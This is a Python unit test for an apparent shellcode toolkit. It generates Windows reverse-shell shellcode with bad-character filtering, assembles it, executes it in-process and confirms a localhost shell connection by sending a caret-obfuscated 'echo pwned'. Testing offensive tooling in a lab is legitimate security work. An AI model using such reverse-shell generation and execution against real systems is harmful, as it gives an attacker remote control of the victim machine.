import random
import socket
import time
import unittest

from coder import reverse_shell
from runner import load_shellcode, run_shellcode
from stones import assemble


class TestReverseShell(unittest.TestCase):
    def test_run_shellcode(self):
        port = random.randint(49152, 65535)

        code = reverse_shell.generate(
            "127.0.0.1",
            port,
            bad_chars=b"\x00",
            exit_func=("ntdll.dll", "RtlExitUserThread"),
            debug=False,
        )
        shellcode = assemble(code)

        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.bind(("0.0.0.0", port))
            s.listen()

            ptr = load_shellcode(shellcode)
            run_shellcode(ptr, wait=False)

            client_s, _ = s.accept()

        client_s.send(b"echo p^w^n^e^d\r\n")
        time.sleep(0.5)

        resp = client_s.recv(0x1000)
        client_s.send(b"exit\r\n")
        client_s.close()

        self.assertIn(b"pwned", resp)
